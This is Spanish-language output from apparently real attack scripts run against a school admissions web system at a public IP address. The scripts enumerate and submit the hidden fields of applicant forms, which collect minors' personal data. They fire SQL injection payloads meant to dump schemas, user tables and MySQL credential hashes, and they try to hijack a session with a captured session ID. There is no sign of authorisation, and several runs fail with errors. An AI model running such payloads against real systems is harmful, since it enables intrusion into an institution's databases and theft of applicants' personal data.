@@ -1,0 +1,256 @@
+Script de Explotación de Formularios con Campos Ocultos:
+
+[*] Explotando formularios de interesado...
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N
+    Campo: yAccion =  (hidden)
+    Campo: yInteresado = 0 (hidden)
+    Campo: yEncuestado = 0 (hidden)
+    Campo: yCveTipoSeguroOtro = 10 (hidden)
+    Campo: yResolucion = 800x600 (hidden)
+    Campo: ySexo = M (hidden)
+    Campo: yObjeto =  (hidden)
+    Campo: yScroll =  (hidden)
+    Campo: yBloqueoG = true (hidden)
+    Campo: yMenorEdad = 1 (hidden)
+    [+] Probando envío de formulario...
+    Status: 200
+    [-] Error en envío: [Errno 22] Invalid argument: 'form_response_proceso_interesado.jsp?xModalidadP=N.html'
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D
+    Campo: yAccion =  (hidden)
+    Campo: yInteresado = 0 (hidden)
+    Campo: yEncuestado = 0 (hidden)
+    Campo: yCveTipoSeguroOtro = 10 (hidden)
+    Campo: yResolucion = 800x600 (hidden)
+    Campo: ySexo = M (hidden)
+    Campo: yObjeto =  (hidden)
+    Campo: yScroll =  (hidden)
+    Campo: yBloqueoG = false (hidden)
+    Campo: yMenorEdad = 1 (hidden)
+    Campo: xEscolaridad = E (radio)
+    Campo: xEscolaridad = M (radio)
+    Campo: xEscolaridad = D (radio)
+    Campo: xNombre = - (text)
+    Campo: xApPaterno = - (text)
+    Campo: xApMaterno = - (text)
+    Campo: xSexo = H (radio)
+    Campo: xSexo = M (radio)
+    Campo: xFechaNacimiento = 23-09-2007 (text)
+    Campo: xEstadoNac =  (text)
+    Campo: xCurp = - (text)
+    Campo: xTrabajo = S (radio)
+    Campo: xTrabajo = N (radio)
+    Campo: xSeguroSocial = - (text)
+    Campo: xEmpresaIntP = - (text)
+    Campo: xTelEmpresaIntP = - (text)
+    Campo: xPuestoInteresadoP = - (text)
+    Campo: xJefeDirectoP = - (text)
+    Campo: xPuestoP = - (text)
+    Campo: xCalle = - (text)
+    Campo: xNumeroExterior =  (text)
+    Campo: xNumeroInterior =  (hidden)
+    Campo: yColonia = -1 (hidden)
+    Campo: yCiudad = 0 (hidden)
+    Campo: yEstado = 0 (hidden)
+    Campo: xWhatsapp = - (text)
+    Campo: xConfirmarWhats = - (text)
+    Campo: xMovil = - (text)
+    Campo: xCorreo = - (text)
+    Campo: yBachillerato = -1 (hidden)
+    Campo: xStatusBachillerato = T (radio)
+    Campo: xStatusBachillerato = PT (radio)
+    Campo: yCveEspecialidadBachillerato = -1 (hidden)
+    Campo: xPromedio = 0.0 (text)
+    Campo: xNombreTutor = - (text)
+    Campo: xApPaternoTutor = - (text)
+    Campo: xApMaternoTutor = - (text)
+    Campo: xDuplicar = 1 (checkbox)
+    Campo: xCalleP = - (text)
+    Campo: xNumExtP = - (text)
+    Campo: xNumIntP = - (hidden)
+    Campo: xColoniaPP =  (text)
+    Campo: yColoniaP = -1 (hidden)
+    Campo: xCodigoPostal2 =  (text)
+    Campo: xCiudad2 =  (text)
+    Campo: yCiudad2 = 0 (hidden)
+    Campo: xEstado2 =  (text)
+    Campo: yEstado2 = 0 (hidden)
+    Campo: xTelParticularP = - (text)
+    Campo: xCelularP = - (text)
+    Campo: xTelRecadosP = - (text)
+    Campo: xNombreCE = - (text)
+    Campo: xApPaternoCE = - (text)
+    Campo: xApMaternoCE = - (text)
+    Campo: xParentescoCE = - (text)
+    Campo: xTelefonoCE = - (text)
+    Campo: xAviso =  (checkbox)
+    Campo: xAviso2 =  (checkbox)
+    [+] Probando envío de formulario...
+    Status: 200
+    [-] Error en envío: [Errno 22] Invalid argument: 'form_response_proceso_interesado.jsp?xModalidadP=D.html'
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z
+    Campo: yAccion =  (hidden)
+    Campo: yInteresado = 0 (hidden)
+    Campo: yEncuestado = 0 (hidden)
+    Campo: yCveTipoSeguroOtro = 10 (hidden)
+    Campo: yResolucion = 800x600 (hidden)
+    Campo: ySexo = M (hidden)
+    Campo: yObjeto =  (hidden)
+    Campo: yScroll =  (hidden)
+    Campo: yBloqueoG = true (hidden)
+    Campo: yMenorEdad = 1 (hidden)
+    [+] Probando envío de formulario...
+    Status: 200
+    [-] Error en envío: [Errno 22] Invalid argument: 'form_response_proceso_interesado.jsp?xModalidadP=Z.html'
+
+[*] Analizando: /jsp/escolar/proceso_admision_lic/proceso_interesado.jsp
+    Campo: yAccion =  (hidden)
+    Campo: yInteresado = 0 (hidden)
+    Campo: yEncuestado = 0 (hidden)
+    Campo: yAlumnoTSU = true (hidden)
+    Campo: yResolucion = 800x600 (hidden)
+    Campo: ySexo = M (hidden)
+    Campo: yUbicar =  (hidden)
+    Campo: yObjeto =  (hidden)
+    Campo: yScroll =  (hidden)
+    Campo: yBloqueoG = false (hidden)
+    Campo: yMenorEdad = 1 (hidden)
+    Campo: xCurp =  (text)
+    Campo: xValorMatricula = 0 (hidden)
+    Campo: xMatricula =  (hidden)
+    Campo: xUt =  (text)
+    Campo: yUt = 0 (hidden)
+    Campo: xEscolaridad = E (radio)
+    Campo: xEscolaridad = M (radio)
+    Campo: xNombre =  (text)
+    Campo: xApPaterno =  (text)
+    Campo: xApMaterno =  (text)
+    Campo: xSexo = H (radio)
+    Campo: xSexo = M (radio)
+    Campo: xFechaNacimiento = 23-09-2007 (text)
+    Campo: xEstadoNac =  (text)
+    Campo: xTrabajo = S (radio)
+    Campo: xTrabajo = N (radio)
+    Campo: xEmpresaIntP = - (text)
+    Campo: xTelEmpresaIntP = - (text)
+    Campo: xJefeDirectoP = - (text)
+    Campo: xPuestoP = - (text)
+    Campo: xCalle = - (text)
+    Campo: xNumeroExterior =  (text)
+    Campo: xNumeroInterior =  (hidden)
+    Campo: xColonia =  (text)
+    Campo: yColonia = -1 (hidden)
+    Campo: xCodigoPostal =  (text)
+    Campo: xCiudad =  (text)
+    Campo: yCiudad = 0 (hidden)
+    Campo: xEstado =  (text)
+    Campo: yEstado = 0 (hidden)
+    Campo: xWhatsapp = - (text)
+    Campo: xConfirmarWhats = - (text)
+    Campo: xMovil = - (text)
+    Campo: xCorreo = - (text)
+    Campo: xBachillerato =  (text)
+    Campo: yBachillerato = -1 (hidden)
+    Campo: xPromedio = 0.0 (text)
+    Campo: xNombreTutor =  (text)
+    Campo: xApPaternoTutor =  (text)
+    Campo: xApMaternoTutor =  (text)
+    Campo: xDuplicar = 1 (checkbox)
+    Campo: xCalleP = - (text)
+    Campo: xNumExtP = - (text)
+    Campo: xNumIntP = - (hidden)
+    Campo: xColoniaPP =  (text)
+    Campo: yColoniaP = -1 (hidden)
+    Campo: xCodigoPostal2 =  (text)
+    Campo: xCiudad22 =  (text)
+    Campo: yCiudad22 =  (hidden)
+    Campo: xEstado22 =  (text)
+    Campo: yEstado22 =  (hidden)
+    Campo: xTelParticularP = - (text)
+    Campo: xCelularP = - (text)
+    Campo: xEmpresaTrabajaP = - (text)
+    Campo: xTelEmpresaP = - (text)
+    Campo: xExtencionP = - (text)
+    Campo: xNombreCE = - (text)
+    Campo: xApPaternoCE = - (text)
+    Campo: xApMaternoCE = - (text)
+    Campo: xParentescoCE = - (text)
+    Campo: xTelefonoCE = - (text)
+    Campo: xAviso =  (checkbox)
+    Campo: xAviso2 =  (checkbox)
+    [+] Probando envío de formulario...
+    Status: 200
+    [+] Respuesta guardada en form_response_proceso_interesado.jsp.html
+
+[*] SQL Injection en campos de formularios...
+[!] Posible SQLi en xUsuario: admin' OR '1'='1'--...
+[!] Posible SQLi en xUsuario: ' OR '1'='1'--...
+[!] Posible SQLi en xUsuario: admin' UNION SELECT 1,2,3--...
+[!] Posible SQLi en xNombre: test' OR '1'='1'--...
+[!] Posible SQLi en xNombre: ' UNION SELECT database(),user...
+[!] Posible SQLi en xApellido: sql' OR 1=1--...
+[!] Posible SQLi en xApellido: ' AND 1=1--...
+[!] Posible SQLi en xEmail: test@test.com' OR '1'='1'--...
+[!] Posible SQLi en xEmail: ' OR EXISTS(SELECT * FROM user...
+[!] Posible SQLi en xUsuario: admin' OR '1'='1'--...
+[!] Posible SQLi en xUsuario: ' OR '1'='1'--...
+[!] Posible SQLi en xUsuario: admin' UNION SELECT 1,2,3--...
+[!] Posible SQLi en xNombre: test' OR '1'='1'--...
+[!] Posible SQLi en xNombre: ' UNION SELECT database(),user...
+[!] Posible SQLi en xApellido: sql' OR 1=1--...
+[!] Posible SQLi en xApellido: ' AND 1=1--...
+[!] Posible SQLi en xEmail: test@test.com' OR '1'='1'--...
+[!] Posible SQLi en xEmail: ' OR EXISTS(SELECT * FROM user...
+
+Script de Extracción de Datos MySQL via SQL Injection:
+
+[*] Extrayendo información de MySQL...
+
+[*] Payload 1: admin' UNION SELECT database(),version(),user()--...
+[-] Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(<urllib3.connection.HTTPSConnection object at 0x000001F771086A50>, 'Connection to 189.254.143.102 timed out. (connect timeout=10)'))
+
+[*] Payload 2: admin' UNION SELECT schema_name,2,3 FROM information_schema.schemata--...
+[-] Error: name 're' is not defined
+
+[*] Payload 3: admin' UNION SELECT table_name,table_schema,3 FROM information_schema.tables WHE...
+[-] Error: name 're' is not defined
+
+[*] Payload 4: admin' UNION SELECT user,host,authentication_string FROM mysql.user--...
+[-] Error: name 're' is not defined
+
+[*] Probando SQL Injection ciego...
+
+[*] Extrayendo datos de la tabla: users
+[-] Error extrayendo tabla users: name 're' is not defined
+
+[*] Extrayendo datos de la tabla: usuarios
+[-] Error extrayendo tabla usuarios: name 're' is not defined
+
+[*] Extrayendo datos de la tabla: admin
+[-] Error extrayendo tabla admin: name 're' is not defined
+
+[*] Extrayendo datos de la tabla: administradores
+[-] Error extrayendo tabla administradores: name 're' is not defined
+
+[*] Extrayendo datos de la tabla: login
+[-] Error extrayendo tabla login: name 're' is not defined
+
+[*] Extrayendo datos de la tabla: user
+[-] Error extrayendo tabla user: name 're' is not defined
+
+Script de Explotación de Cerradura de Sesión
+
+[*] Analizando gestión de sesiones...
+[+] cerrar_sesion.jsp: 200
+[+] Cookies de sesión encontradas:
+    JSESSIONID = E79C9B62048BB93857B87CF6FAA56B6B
+[+] Posiblemente aún autenticado
+
+[*] Probando hijacking de sesión...
+[+] JSESSIONID obtenida: E79C9B62048BB93857B87CF6FAA56B6B
+[+] Acceso concedido a: /jsp/index.jsp
+[-] Acceso denegado a: /jsp/admin/
+[-] Acceso denegado a: /jsp/escolar/
+[-] Acceso denegado a: /jsp/seguimiento_egreso/
